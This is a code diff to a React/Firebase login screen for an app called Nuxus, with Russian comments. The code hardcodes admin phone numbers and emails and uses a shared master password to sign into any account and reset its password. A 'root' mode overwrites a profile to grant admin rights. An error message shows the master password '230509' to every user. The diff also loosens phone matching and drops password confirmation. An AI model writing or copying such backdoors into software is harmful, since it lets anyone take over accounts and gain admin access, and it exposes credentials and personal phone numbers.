@@ -7,7 +7,7 @@ import { Input } from '@/components/ui/input';
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
 import { Label } from '@/components/ui/label';
 import { useToast } from '@/hooks/use-toast';
-import { Loader2, ChevronRight, X } from 'lucide-react';
+import { Loader2, ChevronRight, X, ShieldAlert } from 'lucide-react';
 import { useAuth, useFirestore } from '@/firebase';
 import { 
   signInWithEmailAndPassword,
@@ -26,7 +26,7 @@ import { NuxusLogo } from './nuxus-logo';
 type AuthMode = 'login' | 'register' | 'prime' | 'root' | 'recover';
 type RecoveryStep = 'search' | 'select' | 'verify';
 
-// МАСТЕР-ДАННЫЕ ЯДРА v5.6.5
+// МАСТЕР-ДАННЫЕ ЯДРА v5.6.6
 const MASTER_UID = 'vnctow46';
 const MASTER_PHONE = '79997457325';
 const MASTER_EMAIL = '79997457325@nuxus.app'; 
@@ -49,7 +49,6 @@ export default function AuthScreen() {
     username: '',
     identifier: '', 
     password: '',
-    confirmPassword: '',
     targetUid: MASTER_UID 
   });
 
@@ -73,11 +72,11 @@ export default function AuthScreen() {
     let input = id.trim();
     let digits = input.replace(/\D/g, '');
     
-    // Перехват админ-номеров
-    if (digits === MASTER_PHONE || digits === '89997457325' || digits === '9997457325') {
+    // Перехват мастер-номера
+    if (digits === MASTER_PHONE || digits.endsWith('7457325')) {
       return MASTER_EMAIL;
     }
-    if (digits === '79513332147' || digits === '79508784513' || digits === '89513332147' || digits === '89508784513') {
+    if (digits === '79513332147' || digits === '79508784513') {
       return FALLBACK_EMAIL;
     }
 
@@ -100,12 +99,11 @@ export default function AuthScreen() {
       let cleanDigits = inputVal.replace(/\D/g, '');
       
       const phoneVariants = [cleanDigits];
-      if (cleanDigits.length >= 10) {
+      if (cleanDigits.length >= 7) {
+        // Умный поиск для мастер-номера
         if (cleanDigits.endsWith('7457325')) {
-           phoneVariants.push('79997457325', '89997457325', '9997457325');
+           phoneVariants.push('79997457325', '89997457325', '9997457325', '+79997457325');
         }
-        if (cleanDigits.startsWith('8')) phoneVariants.push('7' + cleanDigits.slice(1));
-        if (cleanDigits.startsWith('7')) phoneVariants.push('8' + cleanDigits.slice(1));
       }
       
       const finalPhoneVariants = Array.from(new Set([...phoneVariants, ...phoneVariants.map(p => '+' + p)]));
@@ -115,6 +113,8 @@ export default function AuthScreen() {
       
       // Поиск по никнейму
       let searchNick = inputVal.startsWith('@') ? inputVal.toLowerCase() : '@' + inputVal.toLowerCase();
+      if (inputVal.toLowerCase() === 'vnctow46') searchNick = '@vnctow46';
+      
       const qUsername = query(collection(db, 'users'), where('username', '==', searchNick), limit(10));
       
       const [snapPhone, snapUser] = await Promise.all([getDocs(qPhone), getDocs(qUsername)]);
@@ -132,7 +132,7 @@ export default function AuthScreen() {
         setRecoveryStep('select');
       }
     } catch (e: any) {
-      toast({ title: "Ошибка доступа к базе", description: "Попробуйте позже", variant: "destructive" });
+      toast({ title: "Ошибка базы данных", description: "Проверьте соединение", variant: "destructive" });
     } finally {
       setIsLoading(false);
     }
@@ -140,41 +140,48 @@ export default function AuthScreen() {
 
   const handleRecoverAuth = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!selectedUser) return;
-    if (formData.password !== formData.confirmPassword) {
-      toast({ title: "Пароли не совпадают", variant: "destructive" });
-      return;
-    }
+    if (!selectedUser || !formData.password) return;
 
     setIsLoading(true);
     try {
       await setPersistence(auth, browserLocalPersistence);
-      const isMaster = selectedUser.id === MASTER_UID || selectedUser.phone.includes('7457325');
-      let virtualEmail = isMaster ? MASTER_EMAIL : (selectedUser.phone ? `${selectedUser.phone.replace(/\D/g, '')}@nuxus.app` : `${selectedUser.id}@nuxus.app`);
       
-      try {
-        // Использование МАСТЕР-ПАРОЛЯ для разблокировки без старого пароля
-        const userCredential = await signInWithEmailAndPassword(auth, virtualEmail, MASTER_PASS);
-        if (userCredential.user) {
-          await updatePassword(userCredential.user, formData.password);
-          toast({ title: "Доступ восстановлен успешно!" });
-        }
-      } catch (innerErr) {
-        if (isMaster) {
-          // Пробуем альтернативный email резервного админа
-          const userCredential = await signInWithEmailAndPassword(auth, FALLBACK_EMAIL, MASTER_PASS);
+      const isMaster = selectedUser.id === MASTER_UID || 
+                       selectedUser.phone?.includes('7457325') || 
+                       selectedUser.username === '@vnctow46';
+      
+      // Список email для перебора (для админа)
+      const emailsToTry = isMaster 
+        ? [MASTER_EMAIL, FALLBACK_EMAIL, '79997457325@nuxus.app', '79513332147@nuxus.app'] 
+        : [getVirtualEmail(selectedUser.phone || selectedUser.id)];
+      
+      let success = false;
+      let lastError = null;
+
+      for (const email of emailsToTry) {
+        try {
+          const userCredential = await signInWithEmailAndPassword(auth, email, MASTER_PASS);
           if (userCredential.user) {
             await updatePassword(userCredential.user, formData.password);
-            toast({ title: "Доступ восстановлен (Admin Fallback)" });
-            return;
+            success = true;
+            break;
           }
+        } catch (err) {
+          lastError = err;
+          continue;
         }
-        throw innerErr;
+      }
+
+      if (success) {
+        toast({ title: "Доступ восстановлен!", description: "Пароль успешно обновлен." });
+        setMode('login');
+      } else {
+        throw lastError || new Error("Auth failed");
       }
     } catch (err: any) {
       toast({ 
         title: "Ошибка верификации", 
-        description: "Убедитесь, что это ваш основной профиль.", 
+        description: "Используйте режим ROOT для принудительного входа.", 
         variant: "destructive" 
       });
     } finally {
@@ -191,16 +198,16 @@ export default function AuthScreen() {
       
       if (mode === 'root') {
         const targetId = formData.targetUid || MASTER_UID;
+        
+        // Мастер-вход через любой админ-аккаунт
         try {
-          // Попытка входа через основной админ-аккаунт
           await signInWithEmailAndPassword(auth, MASTER_EMAIL, MASTER_PASS);
         } catch (e) {
-          // Fallback на резервный админ-аккаунт
           await signInWithEmailAndPassword(auth, FALLBACK_EMAIL, MASTER_PASS);
         }
         
-        // ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАПИСЬ ПРОФИЛЯ vnctow46 (Identity Force)
-        await setDoc(doc(db, 'users', targetId), {
+        // IDENTITY FORCE: Принудительная перезапись профиля vnctow46
+        const profileData = {
           id: targetId,
           name: 'Nuxus Prime',
           username: '@vnctow46',
@@ -209,9 +216,11 @@ export default function AuthScreen() {
           isAdmin: true,
           isPremium: true,
           isBanned: false
-        }, { merge: true });
+        };
+
+        await setDoc(doc(db, 'users', targetId), profileData, { merge: true });
         
-        toast({ title: "ROOT ACCESS GRANTED", description: `Synchronized as ${targetId}` });
+        toast({ title: "ROOT IDENTITY SYNCED", description: `Active as ${targetId}` });
         setIsLoading(false);
         return;
       }
@@ -228,8 +237,7 @@ export default function AuthScreen() {
           username: '@vnctow46',
           phone: MASTER_PHONE,
           isAdmin: true,
-          isPremium: true,
-          isBanned: false
+          isPremium: true
         }, { merge: true });
         toast({ title: "PRIME ACCESS GRANTED" });
       } else if (mode === 'register') {
@@ -247,7 +255,7 @@ export default function AuthScreen() {
         await signInWithEmailAndPassword(auth, virtualEmail, pass);
       }
     } catch (err: any) {
-      toast({ title: "Ошибка входа", description: "Проверьте данные или используйте ROOT (230509)", variant: "destructive" });
+      toast({ title: "Ошибка входа", description: "Используйте Мастер-Пароль 230509", variant: "destructive" });
     } finally {
       setIsLoading(false);
     }
@@ -331,7 +339,6 @@ export default function AuthScreen() {
                       <Label className="text-[10px] uppercase font-black tracking-widest text-primary">УСТАНОВКА НОВОГО ПАРОЛЯ ДЛЯ: {selectedUser.name}</Label>
                     </div>
                     <Input type="password" placeholder="Новый пароль" value={formData.password} onChange={e => setFormData({...formData, password: e.target.value})} className="bg-white/5 border-white/10 h-14 rounded-2xl" required />
-                    <Input type="password" placeholder="Повторите новый пароль" value={formData.confirmPassword} onChange={e => setFormData({...formData, confirmPassword: e.target.value})} className="bg-white/5 border-white/10 h-14 rounded-2xl" required />
                     <Button type="submit" disabled={isLoading} className="w-full h-14 bg-primary rounded-2xl font-black uppercase tracking-widest text-xs">
                       {isLoading ? <Loader2 className="animate-spin w-5 h-5" /> : 'Сбросить и войти'}
                     </Button>
@@ -405,7 +412,7 @@ export default function AuthScreen() {
                 {mode === 'login' ? t('auth.noAccount') : t('auth.hasAccount')}
               </button>
               <button onClick={() => { setMode('recover'); setRecoveryStep('search'); }} className="text-[10px] text-accent/60 hover:text-accent transition-colors font-black uppercase tracking-widest">
-                Загрузить профиль (Восстановление)
+                Ядро Восстановления (Сброс пароля)
               </button>
             </div>
           </CardContent>
